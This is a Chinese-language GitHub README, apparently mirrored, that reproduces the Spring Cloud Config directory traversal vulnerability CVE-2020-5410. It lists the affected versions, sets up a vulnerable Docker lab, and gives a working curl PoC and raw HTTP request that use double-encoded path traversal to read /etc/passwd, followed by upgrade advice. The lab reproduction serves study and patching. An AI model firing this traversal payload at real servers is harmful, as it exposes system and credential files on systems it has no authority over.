# SpringCloud-Config-CVE-2020-5410

Spring Cloud Config 目录穿越漏洞(CVE-2020-5410) 复现

| Infos    | Value                                                              |
| -------- | -------------------------------------------------------------------|
| Username | [https://github.com/thelostworldFree](https://github.com/thelostworldFree) |
| Url      | [https://github.com/thelostworldFree/SpringCloud-Config-CVE-2020-5410](https://github.com/thelostworldFree/SpringCloud-Config-CVE-2020-5410)                                               |
| Stars    | 0                                                          |
| License  | No License                                                        |

<details>

<summary>Topic / Tags</summary>



</details>

## Readme

![a1724f6df71b17c43b625921931ba50a](Spring Cloud Config 目录穿越漏洞(CVE-2020-5410) 复现.resources/79DD2BCC-8F68-44BE-895B-D9CFDE21449B.png)
##### **Spring Cloud Config 目录穿越漏洞(CVE-2020-5410) **

一、漏洞简介

Spring Cloud Config，2.2.3之前的2.2.x版本，2.1.9之前的2.1.x版本以及较旧的不受支持的版本允许应用程序通过spring-cloud-config-server模块提供任意配置文件。恶意用户或攻击者可以使用特制URL发送请求，这可能导致目录遍历攻击。

二、影响版本
Spring Cloud Config: 2.2.0 to 2.2.2
Spring Cloud Config: 2.1.0 to 2.1.8

三、漏洞环境&漏洞复现
PoC:
```
curl "vulnerablemachine:port/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development"
```


```
curl "127.0.0.1:8888/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development"
```

docker环境部署：
```
docker pull hyness/spring-cloud-config-server:2.1.6.RELEASE
```
![c83f0d80c6efec1386f7faede1ec2051](Spring Cloud Config 目录穿越漏洞(CVE-2020-5410) 复现.resources/AA2B853A-FA2F-453C-8FF2-A13BE98D3841.png)
```
docker run -it --name=spring-cloud-config-server \
-p 8888:8888 \
hyness/spring-cloud-config-server:2.1.6.RELEASE \
--spring.cloud.config.server.git.uri=https://github.com/spring-cloud-samples/config-repo
```
![924c06db5e069d1b9b18ce41ba12123e](Spring Cloud Config 目录穿越漏洞(CVE-2020-5410) 复现.resources/C362D909-9416-433D-A892-7A3DFCF9C6C4.png)
访问地址：http://192.168.0.110:8888/
![95eebbdbbadf3c220b9caf9761a9c38d](Spring Cloud Config 目录穿越漏洞(CVE-2020-5410) 复现.resources/B8369FD7-352B-4478-A480-2EE05DE84BE5.png)

执行POC：
curl "192.168.0.110:8888/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development"
![4dc4d01cb8998ed893cce50e1c76c36c](Spring Cloud Config 目录穿越漏洞(CVE-2020-5410) 复现.resources/39334A32-BA49-4ADE-9C1E-2CE7B4C0D328.png)
Burp执行访问：
![34e8d9ae5bf5c2272181dd8bf1bf66ac](Spring Cloud Config 目录穿越漏洞(CVE-2020-5410) 复现.resources/AA0FB5D7-0C3E-4B17-ABDB-59B2DFBE2277.png)
详细数据包：
```
GET /..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development HTTP/1.1
Host: 192.168.0.110:8888
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```
系统执行访问记录：
![c2b4efa0d96dfc202f37e8402c7e4992](Spring Cloud Config 目录穿越漏洞(CVE-2020-5410) 复现.resources/1ED7BEE3-3B56-4CD9-8AB4-E239FF22C9A8.png)


四、修复建议：
升级到 Spring Cloud Config 至2.2.3版本或2.1.9版本，并且将Spring-Cloud-Config-Server服务放置在内网中，同时使用Spring Security进行身份验证。最新版本下载地址为：https://github.com/spring-cloud/spring-cloud-config/releases


参考：
https://github.com/osamahamad/CVE-2020-5410-POC
https://xz.aliyun.com/t/7877
https://blog.csdn.net/wanzt123/article/details/106765503

免责声明：主页提供安全工具、程序(方法)可能带有攻击性，仅供安全研究与教学之用，风险自负!

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。订阅查看更多复现文章、学习笔记

**thelostworld**
安全路上，与你并肩前行！！！！
![065e6eb09c7f0e359b9ed02192293e8e](Spring Cloud Config 目录穿越漏洞(CVE-2020-5410) 复现.resources/扫码_搜索联合传播样式-白色版.png)

个人知乎：

https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：

https://www.jianshu.com/u/bf0e38a8d400

个人CSDN：

https://blog.csdn.net/qq_37602797/category_10169006.html

个人博客园：

https://www.cnblogs.com/thelostworld/

FREEBUF主页：

https://www.freebuf.com/author/thelostworld?type=article

雀语博客主页：

https://www.yuque.com/thelostworld

![fe3787bf5e9e95ca4d9bab0a81b67b6b](Spring Cloud Config 目录穿越漏洞(CVE-2020-5410) 复现.resources/logo.png)# SpringCloud-Config-CVE-2020-5410



## Get the content

```
git clone https://github.com/thelostworldFree/SpringCloud-Config-CVE-2020-5410
cd SpringCloud-Config-CVE-2020-5410
```

{% embed url="https://github.com/thelostworldFree/SpringCloud-Config-CVE-2020-5410" %}

<figure><img src="https://avatars.githubusercontent.com/u/24971604?v=4" alt=""><figcaption><p>thelostworldFree</p></figcaption></figure>
